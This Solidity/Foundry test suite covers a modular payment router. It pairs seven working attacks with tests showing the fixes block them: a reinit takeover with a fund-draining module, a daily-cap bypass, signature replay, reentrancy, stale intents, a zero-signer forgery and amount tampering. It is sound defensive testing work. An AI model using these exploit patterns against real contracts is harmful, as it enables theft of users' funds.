// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {Router} from "../src/Router.sol";
import {LibStorage} from "../src/LibStorage.sol";
import {UpgradeModule, InitModule, WalletModule} from "../src/AdminModules.sol";
import {PaymentModule, Config, Intent} from "../src/PaymentModule.sol";
import {MockUSDC, ITokenReceiver} from "../src/MockUSDC.sol";

interface IRouter {
    function setModule(bytes4[] calldata, address) external;
    function init(address) external;
    function owner() external view returns (address);
    function incrementConfigNonce() external;
    function intentNonce(address) external view returns (uint256);
    function spentOn(address, uint256) external view returns (uint256);
    function executePayment(Config calldata, bytes calldata, Intent calldata, bytes calldata) external;
    function configDigest(Config memory) external view returns (bytes32);
    function intentDigest(Intent memory) external view returns (bytes32);
}

/// What an attacker who owns the router cuts in: a module that runs AS the router, i.e. as the spender of every allowance.
contract DrainModule {
    function drain(address victim, address to) external {
        LibStorage.S storage s = LibStorage.s();
        uint256 a = s.token.allowance(victim, address(this));
        uint256 b = s.token.balanceOf(victim);
        s.token.transferFrom(victim, to, a < b ? a : b);
    }
}

interface IDrain { function drain(address victim, address to) external; }

/// A vendor the owner legitimately allow-listed. Its token hook calls back into the router with the same signed intent.
contract ReentrantVendor is ITokenReceiver {
    IRouter router;
    Config cfg; bytes ownerSig; Intent intent; bytes agentSig;
    uint256 public left;

    constructor(IRouter r) { router = r; }

    function arm(Config calldata c, bytes calldata os, Intent calldata i, bytes calldata as_, uint256 times) external {
        cfg = c; ownerSig = os; intent = i; agentSig = as_; left = times;
    }

    function fire() external { router.executePayment(cfg, ownerSig, intent, agentSig); }

    function onTokenReceived(address, uint256) external {
        if (left > 0) { left--; router.executePayment(cfg, ownerSig, intent, agentSig); }
    }
}

contract RouterBase is Test {
    uint256 aliceKey = 0xA11CE;
    uint256 bobKey = 0xB0B;
    uint256 agentKey = 0xA6E27;
    address alice = vm.addr(aliceKey);
    address bob = vm.addr(bobKey);
    address agent = vm.addr(agentKey);
    address admin = address(0xAD11);
    address mallory = address(0xBAD);
    address vendor = address(0x7E4D);
    MockUSDC usdc;
    uint256 constant ONE = 1e6;
    uint256 constant DAY = 1 days;

    function setUp() public virtual {
        usdc = new MockUSDC();
        vm.warp(1_800_000_000);
    }

    function build(uint256 fixes) internal returns (IRouter r) {
        Router d = new Router(address(usdc), fixes, address(new UpgradeModule()));
        r = IRouter(address(d));
        bytes4[] memory a = new bytes4[](2);
        a[0] = IRouter.init.selector; a[1] = IRouter.owner.selector;
        r.setModule(a, address(new InitModule()));
        bytes4[] memory w = new bytes4[](3);
        w[0] = IRouter.incrementConfigNonce.selector; w[1] = IRouter.intentNonce.selector; w[2] = IRouter.spentOn.selector;
        r.setModule(w, address(new WalletModule()));
        bytes4[] memory p = new bytes4[](3);
        p[0] = IRouter.executePayment.selector; p[1] = IRouter.configDigest.selector; p[2] = IRouter.intentDigest.selector;
        r.setModule(p, address(new PaymentModule()));
        r.init(admin); // the deployer hands the router to the admin; this is meant to be the last privileged call
    }

    function fund(address who, uint256 amount, IRouter r) internal {
        usdc.mint(who, amount);
        vm.prank(who);
        usdc.approve(address(r), type(uint256).max); // the standing allowance: users approve the router once, forever
    }

    function sign(uint256 key, bytes32 digest) internal pure returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, digest);
        return abi.encodePacked(r, s, v);
    }

    function config(address to, uint256 maxPerTx, uint256 dailyCap) internal view returns (Config memory) {
        return Config({owner: alice, agent: agent, recipient: to, maxPerTx: maxPerTx, dailyCap: dailyCap, configNonce: 0});
    }

    function pay(IRouter r, Config memory c, address to, uint256 amount, uint256 nonce, uint256 ts) internal {
        _pay(r, c, to, amount, nonce, ts, "");
    }

    /// Same, but the payment must revert with `err` (signatures are built first so expectRevert hits executePayment itself).
    function payFails(IRouter r, Config memory c, address to, uint256 amount, uint256 nonce, uint256 ts, string memory err) internal {
        _pay(r, c, to, amount, nonce, ts, err);
    }

    function _pay(IRouter r, Config memory c, address to, uint256 amount, uint256 nonce, uint256 ts, string memory err) private {
        Intent memory i = Intent({owner: c.owner, to: to, amount: amount, intentNonce: nonce, ts: ts});
        bytes memory os = sign(aliceKey, r.configDigest(c));
        bytes memory as_ = sign(agentKey, r.intentDigest(i));
        if (bytes(err).length > 0) vm.expectRevert(bytes(err));
        r.executePayment(c, os, i, as_);
    }
}

contract Baseline is RouterBase {
    function test_normal_payment_and_caps_and_kill_switch_work() public {
        IRouter r = build(0);
        fund(alice, 1000 * ONE, r);
        Config memory c = config(vendor, 100 * ONE, 150 * ONE);
        pay(r, c, vendor, 100 * ONE, 1, block.timestamp);
        assertEq(usdc.balanceOf(vendor), 100 * ONE);

        payFails(r, c, vendor, 100 * ONE, 2, block.timestamp, "over daily cap");

        payFails(r, c, vendor, 101 * ONE, 2, block.timestamp, "over per-tx cap");

        vm.prank(alice);
        r.incrementConfigNonce();
        payFails(r, c, vendor, 10 * ONE, 2, block.timestamp, "config revoked");
    }
}

/// O1: initializer can be called again -> attacker owns the router -> cuts in a drain module -> every allowance is theirs.
contract O1_ReinitTakeover is RouterBase {
    function _attack(IRouter r) internal {
        fund(alice, 1000 * ONE, r);
        fund(bob, 400 * ONE, r);
        vm.startPrank(mallory);
        r.init(mallory);
        bytes4[] memory s = new bytes4[](1);
        s[0] = IDrain.drain.selector;
        r.setModule(s, address(new DrainModule()));
        IDrain(address(r)).drain(alice, mallory);
        IDrain(address(r)).drain(bob, mallory);
        vm.stopPrank();
    }

    function test_vulnerable_anyone_can_reinit_and_drain_every_user() public {
        IRouter r = build(0);
        _attack(r);
        assertEq(r.owner(), mallory);
        assertEq(usdc.balanceOf(mallory), 1400 * ONE);
        console.log("O1 mallory drained (USDC):", usdc.balanceOf(mallory) / ONE);
    }

    function test_fixed_init_is_one_shot() public {
        IRouter r = build(LibStorage.O1_INIT);
        fund(alice, 1000 * ONE, r);
        vm.prank(mallory);
        vm.expectRevert("already initialized");
        r.init(mallory);
        assertEq(r.owner(), admin);
        assertEq(usdc.balanceOf(mallory), 0);
    }
}

/// O2: the daily-cap bucket is taken from the agent-signed timestamp, so a compromised agent just rolls the date forward.
contract O2_CapBucket is RouterBase {
    function test_vulnerable_agent_picks_a_fresh_day_for_every_payment() public {
        IRouter r = build(0);
        fund(alice, 1000 * ONE, r);
        Config memory c = config(vendor, 100 * ONE, 100 * ONE); // $100 per day, $100 per tx
        for (uint256 n = 1; n <= 5; n++) pay(r, c, vendor, 100 * ONE, n, block.timestamp + n * DAY);
        assertEq(usdc.balanceOf(vendor), 500 * ONE);
        console.log("O2 paid in one real day with a $100/day cap (USDC):", usdc.balanceOf(vendor) / ONE);
    }

    function test_fixed_bucket_is_the_block_time() public {
        IRouter r = build(LibStorage.O2_DAYKEY);
        fund(alice, 1000 * ONE, r);
        Config memory c = config(vendor, 100 * ONE, 100 * ONE);
        pay(r, c, vendor, 100 * ONE, 1, block.timestamp + DAY);
        payFails(r, c, vendor, 100 * ONE, 2, block.timestamp + 2 * DAY, "over daily cap");
        assertEq(usdc.balanceOf(vendor), 100 * ONE);
    }
}

/// O3: the owner's config signature is not bound to a chain or a contract, so a config signed for staging works on production.
contract O3_Replay is RouterBase {
    function test_vulnerable_staging_config_spends_real_funds_on_production() public {
        IRouter staging = build(0);
        IRouter prod = build(0);
        fund(alice, 1000 * ONE, prod); // alice only ever approved prod with real money
        Config memory loose = config(vendor, 1000 * ONE, 1000 * ONE); // generous limits, signed for testing on staging
        bytes memory ownerSig = sign(aliceKey, staging.configDigest(loose));
        Intent memory i = Intent({owner: alice, to: vendor, amount: 900 * ONE, intentNonce: 1, ts: block.timestamp});
        prod.executePayment(loose, ownerSig, i, sign(agentKey, prod.intentDigest(i))); // the agent signs for prod itself
        assertEq(usdc.balanceOf(vendor), 900 * ONE);
        console.log("O3 staging-signed config spent on prod (USDC):", usdc.balanceOf(vendor) / ONE);
    }

    function test_fixed_signature_is_bound_to_chain_and_contract() public {
        IRouter staging = build(LibStorage.O3_DOMAIN);
        IRouter prod = build(LibStorage.O3_DOMAIN);
        fund(alice, 1000 * ONE, prod);
        Config memory loose = config(vendor, 1000 * ONE, 1000 * ONE);
        bytes memory ownerSig = sign(aliceKey, staging.configDigest(loose));
        Intent memory i = Intent({owner: alice, to: vendor, amount: 900 * ONE, intentNonce: 1, ts: block.timestamp});
        bytes memory agentSig = sign(agentKey, prod.intentDigest(i));
        vm.expectRevert("owner sig");
        prod.executePayment(loose, ownerSig, i, agentSig);
    }
}

/// O4: the token call happens before the nonce and the daily counter are updated; a hook re-enters with the same intent.
contract O4_Reentrancy is RouterBase {
    function _run(uint256 fixes) internal returns (ReentrantVendor v, IRouter r) {
        r = build(fixes);
        fund(alice, 1000 * ONE, r);
        v = new ReentrantVendor(r);
        Config memory c = config(address(v), 100 * ONE, 100 * ONE); // $100 per tx, $100 per day
        Intent memory i = Intent({owner: alice, to: address(v), amount: 100 * ONE, intentNonce: 1, ts: block.timestamp});
        bytes memory os = sign(aliceKey, r.configDigest(c));
        bytes memory as_ = sign(agentKey, r.intentDigest(i));
        v.arm(c, os, i, as_, 5);
        v.fire();
    }

    function test_vulnerable_one_signed_intent_pays_six_times() public {
        (ReentrantVendor v, IRouter r) = _run(0);
        assertEq(usdc.balanceOf(address(v)), 600 * ONE);
        assertEq(r.intentNonce(alice), 1); // the ledger of record says one payment
        console.log("O4 one $100 intent, daily cap $100, paid (USDC):", usdc.balanceOf(address(v)) / ONE);
    }

    function test_fixed_reentry_is_rejected() public {
        vm.expectRevert("reentrant"); // the hook's nested call reverts and the revert bubbles up through the token call
        this.runFixed();
    }

    function runFixed() external { _run(LibStorage.O4_REENTRY); }

    function test_fixed_even_without_the_guard_effects_come_first() public {
        // sanity: with the fix, a plain (non-reentrant) payment still works exactly once
        IRouter r = build(LibStorage.ALL);
        fund(alice, 1000 * ONE, r);
        Config memory c = config(vendor, 100 * ONE, 100 * ONE);
        pay(r, c, vendor, 100 * ONE, 1, block.timestamp);
        assertEq(usdc.balanceOf(vendor), 100 * ONE);
        payFails(r, c, vendor, 100 * ONE, 1, block.timestamp, "intent nonce");
    }
}

/// O5: signed intents never expire; a withheld intent is executed 30 days later.
contract O5_StaleIntent is RouterBase {
    function _signed(IRouter r) internal view returns (Config memory c, bytes memory os, Intent memory i, bytes memory as_) {
        c = config(vendor, 100 * ONE, 100 * ONE);
        i = Intent({owner: alice, to: vendor, amount: 100 * ONE, intentNonce: 1, ts: block.timestamp});
        os = sign(aliceKey, r.configDigest(c));
        as_ = sign(agentKey, r.intentDigest(i));
    }

    function test_vulnerable_a_month_old_intent_still_pays() public {
        IRouter r = build(0);
        fund(alice, 1000 * ONE, r);
        (Config memory c, bytes memory os, Intent memory i, bytes memory as_) = _signed(r);
        vm.warp(block.timestamp + 30 days); // the invoice was cancelled meanwhile; nobody told the contract
        vm.prank(mallory);
        r.executePayment(c, os, i, as_);
        assertEq(usdc.balanceOf(vendor), 100 * ONE);
    }

    function test_fixed_intent_expires() public {
        IRouter r = build(LibStorage.O5_EXPIRY);
        fund(alice, 1000 * ONE, r);
        (Config memory c, bytes memory os, Intent memory i, bytes memory as_) = _signed(r);
        vm.warp(block.timestamp + 30 days);
        vm.expectRevert("stale intent");
        r.executePayment(c, os, i, as_);
        // a fresh intent inside the window still works
        vm.warp(block.timestamp - 30 days + 10 minutes);
        r.executePayment(c, os, i, as_);
        assertEq(usdc.balanceOf(vendor), 100 * ONE);
    }

    function test_fixed_a_timestamp_from_the_future_is_refused() public {
        IRouter r = build(LibStorage.O5_EXPIRY);
        fund(alice, 1000 * ONE, r);
        Config memory c = config(vendor, 100 * ONE, 100 * ONE);
        payFails(r, c, vendor, 10 * ONE, 1, block.timestamp + 1 days, "stale intent");
    }
}

/// O6: the owner's config leaves `agent` unset (address(0)); an invalid signature "recovers" to address(0) and passes.
contract O6_ZeroSigner is RouterBase {
    function _attack(IRouter r) internal {
        fund(alice, 1000 * ONE, r);
        Config memory c = Config({owner: alice, agent: address(0), recipient: vendor, maxPerTx: 100 * ONE, dailyCap: 100 * ONE, configNonce: 0});
        bytes memory os = sign(aliceKey, r.configDigest(c)); // a half-filled config the owner signed (a template, a draft)
        Intent memory i = Intent({owner: alice, to: vendor, amount: 100 * ONE, intentNonce: 1, ts: block.timestamp});
        bytes memory garbage = abi.encodePacked(bytes32(0), bytes32(0), uint8(27)); // not a signature by anyone
        vm.prank(mallory);
        r.executePayment(c, os, i, garbage);
    }

    function test_vulnerable_garbage_signature_authorises_a_payment() public {
        IRouter r = build(0);
        _attack(r);
        assertEq(usdc.balanceOf(vendor), 100 * ONE); // no agent ever approved this
    }

    function test_fixed_invalid_signature_is_rejected() public {
        IRouter r = build(LibStorage.O6_ZERO_SIGNER);
        vm.expectRevert("bad sig");
        this.attackFixed(r);
        assertEq(usdc.balanceOf(vendor), 0);
    }

    function attackFixed(IRouter r) external { _attack(r); }
}

/// O7: the agent's signature does not cover the amount, so whoever relays the intent can raise it to the per-tx cap.
contract O7_UnsignedAmount is RouterBase {
    function _relay(IRouter r) internal {
        fund(alice, 1000 * ONE, r);
        Config memory c = config(vendor, 100 * ONE, 100 * ONE);
        bytes memory os = sign(aliceKey, r.configDigest(c));
        Intent memory approved = Intent({owner: alice, to: vendor, amount: 10 * ONE, intentNonce: 1, ts: block.timestamp});
        bytes memory as_ = sign(agentKey, r.intentDigest(approved)); // the agent approved $10
        Intent memory tampered = approved;
        tampered.amount = 100 * ONE; // the relayer swaps in the maximum
        vm.prank(mallory);
        r.executePayment(c, os, tampered, as_);
    }

    function test_vulnerable_relayer_turns_10_into_100() public {
        IRouter r = build(0);
        _relay(r);
        assertEq(usdc.balanceOf(vendor), 100 * ONE);
    }

    function test_fixed_amount_is_part_of_the_signature() public {
        IRouter r = build(LibStorage.O7_AMOUNT);
        vm.expectRevert("agent sig");
        this.relayFixed(r);
        assertEq(usdc.balanceOf(vendor), 0);
    }

    function relayFixed(IRouter r) external { _relay(r); }
}
